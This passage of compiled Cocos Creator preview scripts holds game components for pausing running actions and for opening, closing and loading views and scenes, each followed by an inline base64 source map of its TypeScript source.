Rvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5LCBtZW51fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5lbnVtIFJpZ2lkQm9keUNvbGxpc2lvblR5cGV7XHJcbiAgICBvbkJlZ2luQ29udGFjdCxcclxuICAgIG9uRW5kQ29udGFjdCxcclxuICAgIG9uUHJlU29sdmUsXHJcbiAgICBvblBvc3RTb2x2ZSxcclxufVxyXG5cclxubGV0IG1hcCA9IG5ldyBNYXA8UmlnaWRCb2R5Q29sbGlzaW9uVHlwZSwgc3RyaW5nPigpO1xyXG5tYXAuc2V0KFJpZ2lkQm9keUNvbGxpc2lvblR5cGUub25CZWdpbkNvbnRhY3QsIFwib25CZWdpbkNvbnRhY3RcIik7XHJcbm1hcC5zZXQoUmlnaWRCb2R5Q29sbGlzaW9uVHlwZS5vbkVuZENvbnRhY3QsIFwib25FbmRDb250YWN0XCIpO1xyXG5tYXAuc2V0KFJpZ2lkQm9keUNvbGxpc2lvblR5cGUub25QcmVTb2x2ZSwgXCJvblByZVNvbHZlXCIpO1xyXG5tYXAuc2V0KFJpZ2lkQm9keUNvbGxpc2lvblR5cGUub25Qb3N0U29sdmUsIFwib25Qb3N0U29sdmVcIik7XHJcblxyXG5cclxuQGNjY2xhc3NcclxuQG1lbnUoXCLoh6rlrprkuYkvUmlnaWRCb2R5Q29sbGlzaW9uRXZlbnRcIilcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgUmlnaWRCb2R5Q29sbGlzaW9uRXZlbnQgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5FbnVtKFJpZ2lkQm9keUNvbGxpc2lvblR5cGUpLCBkaXNwbGF5TmFtZTpcIuWImuS9k+eisOaSnuexu+Wei1wifSlcclxuICAgIGNvbGxpc2lvblR5cGU6UmlnaWRCb2R5Q29sbGlzaW9uVHlwZSA9IFJpZ2lkQm9keUNvbGxpc2lvblR5cGUub25CZWdpbkNvbnRhY3Q7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIsIGRpc3BsYXlOYW1lOlwi6Kem5Y+R5LqL5Lu2XCJ9KVxyXG4gICAgZXZlbnRIYW5kbGVyczpbY2MuQ29tcG9uZW50LkV2ZW50SGFuZGxlcl0gPSBbXTtcclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzW21hcC5nZXQodGhpcy5jb2xsaXNpb25UeXBlKV0gPSBhc3luYyAoLi4uYXJncyk9PntcclxuICAgICAgICAgICAgY2MuQ29tcG9uZW50LkV2ZW50SGFuZGxlci5lbWl0RXZlbnRzKHRoaXMuZXZlbnRIYW5kbGVycywgLi4uYXJncyk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/PauseAllRunningActions.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '76cc4E/XWhMC562JoS9uogz', 'PauseAllRunningActions');
// framework/component/PauseAllRunningActions.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, menu = _a.menu;
var PauseAllRunningActions = /** @class */ (function (_super) {
    __extends(PauseAllRunningActions, _super);
    function PauseAllRunningActions() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    PauseAllRunningActions.prototype.onLoad = function () {
        var list = cc.director.getActionManager().pauseAllRunningActions();
        this.onDestroy = function () {
            cc.director.getActionManager().resumeTargets(list);
        };
    };
    PauseAllRunningActions = __decorate([
        ccclass,
        menu("自定义/PauseAllRunningActions")
    ], PauseAllRunningActions);
    return PauseAllRunningActions;
}(cc.Component));
exports.default = PauseAllRunningActions;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L1BhdXNlQWxsUnVubmluZ0FjdGlvbnMudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNNLElBQUEsS0FBa0IsRUFBRSxDQUFDLFVBQVUsRUFBOUIsT0FBTyxhQUFBLEVBQUUsSUFBSSxVQUFpQixDQUFDO0FBSXRDO0lBQW9ELDBDQUFZO0lBQWhFOztJQU9BLENBQUM7SUFORyx1Q0FBTSxHQUFOO1FBQ0ksSUFBSSxJQUFJLEdBQUcsRUFBRSxDQUFDLFFBQVEsQ0FBQyxnQkFBZ0IsRUFBRSxDQUFDLHNCQUFzQixFQUFFLENBQUM7UUFDbkUsSUFBSSxDQUFDLFNBQVMsR0FBRztZQUNiLEVBQUUsQ0FBQyxRQUFRLENBQUMsZ0JBQWdCLEVBQUUsQ0FBQyxhQUFhLENBQUMsSUFBSSxDQUFDLENBQUM7UUFDdkQsQ0FBQyxDQUFDO0lBQ04sQ0FBQztJQU5nQixzQkFBc0I7UUFGMUMsT0FBTztRQUNQLElBQUksQ0FBQyw0QkFBNEIsQ0FBQztPQUNkLHNCQUFzQixDQU8xQztJQUFELDZCQUFDO0NBUEQsQUFPQyxDQVBtRCxFQUFFLENBQUMsU0FBUyxHQU8vRDtrQkFQb0Isc0JBQXNCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmNvbnN0IHtjY2NsYXNzLCBtZW51fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5AbWVudShcIuiHquWumuS5iS9QYXVzZUFsbFJ1bm5pbmdBY3Rpb25zXCIpXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFBhdXNlQWxsUnVubmluZ0FjdGlvbnMgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG4gICAgb25Mb2FkICgpIHtcclxuICAgICAgICBsZXQgbGlzdCA9IGNjLmRpcmVjdG9yLmdldEFjdGlvbk1hbmFnZXIoKS5wYXVzZUFsbFJ1bm5pbmdBY3Rpb25zKCk7XHJcbiAgICAgICAgdGhpcy5vbkRlc3Ryb3kgPSAoKT0+e1xyXG4gICAgICAgICAgICBjYy5kaXJlY3Rvci5nZXRBY3Rpb25NYW5hZ2VyKCkucmVzdW1lVGFyZ2V0cyhsaXN0KTtcclxuICAgICAgICB9O1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/View.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a2bbdzy4UJJ65VrnqbThiRb', 'View');
// framework/component/View.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Extend_1 = require("../extend/Extend");
var Facade_1 = require("../facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu;
var View = /** @class */ (function (_super) {
    __extends(View, _super);
    function View() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.startCommandName = "";
        _this.adapterIphoneX = [];
        _this.targetToCanvas = [];
        _this.screenSize = [];
        _this.releasePrefab = false;
        return _this;
    }
    View_1 = View;
    View.prototype.onLoad = function () {
        if (Extend_1.ext.isIphoneX) {
            this.adapterIphoneX.forEach(function (value) { return value.top += View_1.IPHONEX_TOP_BLACK_HEIGHT; });
        }
        this.targetToCanvas.forEach(function (value) { return value.target = Facade_1.default.canvasNode; });
        this.screenSize.forEach(function (value) { return value.setContentSize(Facade_1.default.canvasNode.getContentSize()); });
    };
    View.prototype.start = function () {
        if (this.startCommandName != "") {
            Facade_1.default.executeCommand(this.startCommandName);
        }
    };
    View.prototype.onDestroy = function () {
        if (this.releasePrefab) {
            Facade_1.default.releasePrefab("prefab/" + this.node.name);
        }
    };
    /**
     * @param data commandName
     * */
    View.prototype.closeView = function (event, data) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        if (!(typeof data == "string" && data != "")) return [3 /*break*/, 2];
                        return [4 /*yield*/, Facade_1.default.executeCommand(data)];
                    case 1:
                        _a.sent();
                        _a.label = 2;
                    case 2: return [4 /*yield*/, Facade_1.default.executeCommand("CloseViewCommand", this.node)];
                    case 3:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /**
     * @param data commandName
     * */
    View.prototype.closeViewWithClickSound = function (event, data) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        View_1.executeClickSoundCommand(event, data);
                        return [4 /*yield*/, this.closeView(event, data)];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /**
     * @param data prefabName
     * */
    View.prototype.openView = function (event, data) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0: return [4 /*yield*/, Facade_1.default.executeCommand("OpenViewCommand", data)];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /**
     * @param data prefabName
     * */
    View.prototype.openViewWithClickSound = function (event, data) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        View_1.executeClickSoundCommand(event, data);
                        return [4 /*yield*/, this.openView(event, data)];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /**
     * @param data sceneName
     * */
    View.prototype.loadScene = function (event, data) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0: return [4 /*yield*/, Facade_1.default.executeCommand("LoadSceneCommand", data)];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /**
     * @param data sceneName
     * */
    View.prototype.loadSceneWithClickSound = function (event, data) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        View_1.executeClickSoundCommand(event, data);
                        return [4 /*yield*/, Facade_1.default.executeCommand("LoadSceneCommand", data)];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /**
     * @param data commandName
     * */
    View.prototype.executeCommand = function (event, data) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0: return [4 /*yield*/, Facade_1.default.executeCommand(data, event)];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /**
     * @param data commandName
     * */
    View.prototype.executeCommandWithClickSound = function (event, data) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        View_1.executeClickSoundCommand(event, data);
                        return [4 /*yield*/, this.executeCommand(event, data)];
                    case 1:
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    /**
     * 点击按钮时播放声音
     * */
    View.executeClickSoundCommand = function (event, data) {
        if (View_1.clickSoundCommand) {
            Facade_1.default.executeCommand(View_1.clickSoundCommand, event, data);
        }
    };
    var View_1;
    View.clickSoundCommand = null;
    View.IPHONEX_TOP_BLACK_HEIGHT = 66;
    __decorate([
        property({ displayName: "启动命令", tooltip: "加载成功后执行启动命令" })
    ], View.prototype, "startCommandName", void 0);
    __decorate([
        property({ type: cc.Widget, displayName: "适配IphoneX", tooltip: "widget.top += 66" })
    ], View.prototype, "adapterIphoneX", void 0);
    __decorate([
        property({ type: cc.Widget, displayName: "绑定Canvas", tooltip: "widget.target=canvas" })
    ], View.prototype, "targetToCanvas", void 0);
    __decorate([
        property({ type: cc.Node, displayName: "设置屏幕大小", tooltip: "node.setContentSize(screenSize)" })
    ], View.prototype, "screenSize", void 0);
    __decorate([
        property
    ], View.prototype, "releasePrefab", void 0);
    View = View_1 = __decorate([
        ccclass,
        menu("自定义/View")
    ], View);
    return View;
}(cc.Component));
exports.default = View;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L1ZpZXcudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7O0FBR25HLDJDQUFxQztBQUNyQywyQ0FBc0M7QUFFaEMsSUFBQSxLQUE0QixFQUFFLENBQUMsVUFBVSxFQUF4QyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQUEsRUFBRSxJQUFJLFVBQWlCLENBQUM7QUFJaEQ7SUFBa0Msd0JBQVk7SUFBOUM7UUFBQSxxRUFzSEM7UUEvR0csc0JBQWdCLEdBQUcsRUFBRSxDQUFDO1FBR3RCLG9CQUFjLEdBQWUsRUFBRSxDQUFDO1FBR2hDLG9CQUFjLEdBQWUsRUFBRSxDQUFDO1FBR2hDLGdCQUFVLEdBQWEsRUFBRSxDQUFDO1FBRzFCLG1CQUFhLEdBQUcsS0FBSyxDQUFDOztJQW1HMUIsQ0FBQzthQXRIb0IsSUFBSTtJQXFCckIscUJBQU0sR0FBTjtRQUNJLElBQUksWUFBRyxDQUFDLFNBQVMsRUFBQztZQUNkLElBQUksQ0FBQyxjQUFjLENBQUMsT0FBTyxDQUFDLFVBQUEsS0FBSyxJQUFJLE9BQUEsS0FBSyxDQUFDLEdBQUcsSUFBSSxNQUFJLENBQUMsd0JBQXdCLEVBQTFDLENBQTBDLENBQUMsQ0FBQztTQUNwRjtRQUNELElBQUksQ0FBQyxjQUFjLENBQUMsT0FBTyxDQUFDLFVBQUEsS0FBSyxJQUFJLE9BQUEsS0FBSyxDQUFDLE1BQU0sR0FBRyxnQkFBTSxDQUFDLFVBQVUsRUFBaEMsQ0FBZ0MsQ0FBQyxDQUFDO1FBQ3ZFLElBQUksQ0FBQyxVQUFVLENBQUMsT0FBTyxDQUFDLFVBQUEsS0FBSyxJQUFJLE9BQUEsS0FBSyxDQUFDLGNBQWMsQ0FBQyxnQkFBTSxDQUFDLFVBQVUsQ0FB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O0tBQzFDO0lBR0Q7O1NBRUs7SUFDRSw2QkFBd0IsR0FBL0IsVUFBZ0MsS0FBSyxFQUFFLElBQUk7UUFDdkMsSUFBSSxNQUFJLENBQUMsaUJBQWlCLEVBQUM7WUFDdkIsZ0JBQU0sQ0FBQyxjQUFjLENBQUMsTUFBSSxDQUFDLGlCQUFpQixFQUFFLEtBQUssRUFBRSxJQUFJLENBQUMsQ0FBQztTQUM5RDtJQUNMLENBQUM7O0lBL0dNLHNCQUFpQixHQUFVLElBQUksQ0FBQztJQUVoQyw2QkFBd0IsR0FBRyxFQUFFLENBQUM7SUFHckM7UUFEQyxRQUFRLENBQUMsRUFBQyxXQUFXLEVBQUMsTUFBTSxFQUFFLE9BQU8sRUFBQyxhQUFhLEVBQUMsQ0FBQztrREFDaEM7SUFHdEI7UUFEQyxRQUFRLENBQUMsRUFBQyxJQUFJLEVBQUMsRUFBRSxDQUFDLE1BQU0sRUFBRSxXQUFXLEVBQUMsV0FBVyxFQUFFLE9BQU8sRUFBQyxrQkFBa0IsRUFBQyxDQUFDO2dEQUNoRDtJQUdoQztRQURDLFFBQVEsQ0FBQyxFQUFDLElBQUksRUFBQyxFQUFFLENBQUMsTUFBTSxFQUFFLFdBQVcsRUFBQyxVQUFVLEVBQUUsT0FBTyxFQUFDLHNCQUFzQixFQUFDLENBQUM7Z0RBQ25EO0lBR2hDO1FBREMsUUFBUSxDQUFDLEVBQUMsSUFBSSxFQUFDLEVBQUUsQ0FBQyxJQUFJLEVBQUUsV0FBVyxFQUFDLFFBQVEsRUFBRSxPQUFPLEVBQUMsaUNBQWlDLEVBQUMsQ0FBQzs0Q0FDaEU7SUFHMUI7UUFEQyxRQUFROytDQUNhO0lBbkJMLElBQUk7UUFGeEIsT0FBTztRQUNQLElBQUksQ0FBQyxVQUFVLENBQUM7T0FDSSxJQUFJLENBc0h4QjtJQUFELFdBQUM7Q0F0SEQsQUFzSEMsQ0F0SGlDLEVBQUUsQ0FBQyxTQUFTLEdBc0g3QztrQkF0SG9CLElBQUkiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcblxyXG5pbXBvcnQge2V4dH0gZnJvbSBcIi4uL2V4dGVuZC9FeHRlbmRcIjtcclxuaW1wb3J0IEZhY2FkZSBmcm9tIFwiLi4vZmFjYWRlL0ZhY2FkZVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5LCBtZW51fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5AbWVudShcIuiHquWumuS5iS9WaWV3XCIpXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFZpZXcgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIHN0YXRpYyBjbGlja1NvdW5kQ29tbWFuZDpzdHJpbmcgPSBudWxsO1xyXG5cclxuICAgIHN0YXRpYyBJUEhPTkVYX1RPUF9CTEFDS19IRUlHSFQgPSA2NjtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi5ZCv5Yqo5ZG95LukXCIsIHRvb2x0aXA6XCLliqDovb3miJDlip/lkI7miafooYzlkK/liqjlkb3ku6RcIn0pXHJcbiAgICBzdGFydENvbW1hbmROYW1lID0gXCJcIjtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuV2lkZ2V0LCBkaXNwbGF5TmFtZTpcIumAgumFjUlwaG9uZVhcIiwgdG9vbHRpcDpcIndpZGdldC50b3AgKz0gNjZcIn0pXHJcbiAgICBhZGFwdGVySXBob25lWDpbY2MuV2lkZ2V0XSA9IFtdO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5XaWRnZXQsIGRpc3BsYXlOYW1lOlwi57uR5a6aQ2FudmFzXCIsIHRvb2x0aXA6XCJ3aWRnZXQudGFyZ2V0PWNhbnZhc1wifSlcclxuICAgIHRhcmdldFRvQ2FudmFzOltjYy5XaWRnZXRdID0gW107XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLk5vZGUsIGRpc3BsYXlOYW1lOlwi6K6+572u5bGP5bmV5aSn5bCPXCIsIHRvb2x0aXA6XCJub2RlLnNldENvbnRlbnRTaXplKHNjcmVlblNpemUpXCJ9KVxyXG4gICAgc2NyZWVuU2l6ZTpbY2MuTm9kZV0gPSBbXTtcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIHJlbGVhc2VQcmVmYWIgPSBmYWxzZTtcclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICBpZiAoZXh0LmlzSXBob25lWCl7XHJcbiAgICAgICAgICAgIHRoaXMuYWRhcHRlcklwaG9uZVguZm9yRWFjaCh2YWx1ZSA9PiB2YWx1ZS50b3AgKz0gVmlldy5JUEhPTkVYX1RPUF9CTEFDS19IRUlHSFQpO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLnRhcmdldFRvQ2FudmFzLmZvckVhY2godmFsdWUgPT4gdmFsdWUudGFyZ2V0ID0gRmFjYWRlLmNhbnZhc05vZGUpO1xyXG4gICAgICAgIHRoaXMuc2NyZWVuU2l6ZS5mb3JFYWNoKHZhbHVlID0+IHZhbHVlLnNldENvbnRlbnRTaXplKEZhY2FkZS5jYW52YXNOb2RlLmdldENvbnRlbnRTaXplKCkpKVxyXG4gICAgfVxyXG5cclxuICAgIHN0YXJ0KCl7XHJcbiAgICAgICAgaWYgKHRoaXMuc3RhcnRDb21tYW5kTmFtZSAhPSBcIlwiKXtcclxuICAgICAgICAgICAgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKHRoaXMuc3RhcnRDb21tYW5kTmFtZSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIG9uRGVzdHJveSgpe1xyXG4gICAgICAgIGlmICh0aGlzLnJlbGVhc2VQcmVmYWIpe1xyXG4gICAgICAgICAgICBGYWNhZGUucmVsZWFzZVByZWZhYihcInByZWZhYi9cIit0aGlzLm5vZGUubmFtZSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHBhcmFtIGRhdGEgY29tbWFuZE5hbWVcclxuICAgICAqICovXHJcbiAgIGFzeW5jIGNsb3NlVmlldyhldmVudCwgZGF0YSl7XHJcbiAgICAgICBpZih0eXBlb2YgZGF0YSA9PSBcInN0cmluZ1wiICYmIGRhdGEgIT0gXCJcIil7XHJcbiAgICAgICAgICAgYXdhaXQgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKGRhdGEpO1xyXG4gICAgICAgfVxyXG4gICAgICAgYXdhaXQgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKFwiQ2xvc2VWaWV3Q29tbWFuZFwiLCB0aGlzLm5v